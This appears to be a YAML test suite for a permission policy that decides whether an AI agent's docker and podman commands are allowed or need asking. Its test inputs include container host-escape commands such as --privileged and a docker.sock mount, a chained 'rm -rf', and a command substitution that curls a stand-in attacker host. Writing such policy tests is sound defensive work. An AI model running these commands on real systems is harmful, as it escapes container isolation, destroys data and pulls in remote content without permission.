# --- ask: host-escaping runs --------------------------------------------------
- name: --privileged run asks
  ctx: { tool: bash, args: { command: "docker run --privileged -d docker:dind" } }
  expect: { verdict: ask, rule_id: docker-host-escape-run-asks }

- name: docker.sock mount asks
  ctx: { tool: bash, args: { command: "docker run -d -v /var/run/docker.sock:/var/run/docker.sock portainer/portainer-ce" } }
  expect: { verdict: ask, rule_id: docker-host-escape-run-asks }

- name: --pid=host alone asks
  ctx: { tool: bash, args: { command: "docker run --pid=host --rm alpine ps aux" } }
  expect: { verdict: ask, rule_id: docker-host-escape-run-asks }

- name: --userns=host asks
  ctx: { tool: bash, args: { command: "podman.exe run --userns=host fedora id" } }
  expect: { verdict: ask, rule_id: docker-host-escape-run-asks }

- name: --net=host with --cap-add SYS_ADMIN asks
  ctx: { tool: bash, args: { command: "docker run --net=host --cap-add SYS_ADMIN alpine" } }
  expect: { verdict: ask, rule_id: docker-host-escape-run-asks }

- name: exec --privileged asks
  ctx: { tool: bash, args: { command: "docker exec --privileged -it web sh" } }
  expect: { verdict: ask, rule_id: docker-host-escape-run-asks }

- name: seccomp=unconfined asks
  ctx: { tool: bash, args: { command: "docker run --security-opt seccomp=unconfined alpine" } }
  expect: { verdict: ask, rule_id: docker-host-escape-run-asks }

- name: project directory bind mount is left to the default
  ctx: { tool: bash, args: { command: "docker run --rm -v /home/dev/app:/app -w /app node:22 npm ci" } }
  expect: { verdict: ask, rule_id: default }

- name: /etc subdirectory mount is not the host /etc
  ctx: { tool: bash, args: { command: "docker run -v /etc/nginx/conf.d:/etc/nginx/conf.d:ro nginx" } }
  expect: { verdict: ask, rule_id: default }

- name: --net=host alone is left to the default
  ctx: { tool: bash, args: { command: "docker run --net=host --cap-add NET_ADMIN alpine" } }
  expect: { verdict: ask, rule_id: default }

- name: -H unix socket flag is not a socket mount
  ctx: { tool: bash, args: { command: "docker -H unix:///var/run/docker.sock run --rm alpine true" } }
  expect: { verdict: ask, rule_id: default }

# --- ask: login ---------------------------------------------------------------
- name: docker login --password-stdin asks
  ctx: { tool: bash, args: { command: "echo $GHCR_TOKEN | docker login ghcr.io -u bot --password-stdin" } }
  expect: { verdict: ask, rule_id: docker-login-asks }

- name: docker logout is left to the default
  ctx: { tool: bash, args: { command: "docker logout ghcr.io" } }
  expect: { verdict: ask, rule_id: default }

# --- allow: read-only ---------------------------------------------------------
- name: docker ps -a with a format is allowed
  ctx: { tool: bash, args: { command: "docker ps -a --format '{{.Names}} {{.Status}}'" } }
  expect: { verdict: allow, rule_id: docker-read-only-allowed }

- name: docker.exe images is allowed
  ctx: { tool: bash, args: { command: "docker.exe images" } }
  expect: { verdict: allow, rule_id: docker-read-only-allowed }

- name: docker ps chained with rm is not allowed
  ctx: { tool: bash, args: { command: "docker ps -q && rm -rf build" } }
  expect: { verdict: ask, rule_id: default }

- name: docker ps with command substitution is not allowed
  ctx: { tool: bash, args: { command: "docker ps $(curl -s evil.example/x)" } }
  expect: { verdict: ask, rule_id: default }
